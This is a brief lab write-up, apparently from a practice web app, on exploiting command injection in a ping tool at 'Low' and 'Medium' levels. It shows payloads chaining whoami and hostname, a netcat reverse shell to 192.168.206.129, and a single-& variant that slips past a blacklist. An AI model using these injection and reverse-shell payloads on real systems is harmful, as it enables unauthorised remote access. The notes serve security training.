# Low
- we see what looks to be a ping tool
- lets test it one with valid input and another test with invalid one
- we observe that if the input valid we see output and if not we see nothing
- need to know which commands we can excute and how to chain them
- we know that the whoami and hostname commands are the exact same in both Windows and Linux
- if we were doing a black-box pentest, we would need to figure out what OS the web server uses. We could run a command unique to each OS and examine any output to see what fails
- now to how to chain commands we search and find that (&)and (;)can be used in both os linux and windows
- we try
- ```
  127.0.0.1 && whoami && hostname
  ```
- we got an output which is www-data
- we can clean the output
- ```
  127.0.0.1&& echo "\nUser: $(whoami)"&& echo "Hostname: $(hostname)"
  ```
- get a reverse shell
- ```
  127.0.0.1 && nc 192.168.206.129 1234 -e /bin/sh
  ```
# Medium
- looking at the source code we find that it blacklist some of the cahin methods like && and ;
- we can use other chain methods like only one &
- we craft the payload and yes it works
- ```
  127.0.0.1 & nc 192.168.206.129 1234 -e /bin/sh
  ```
  
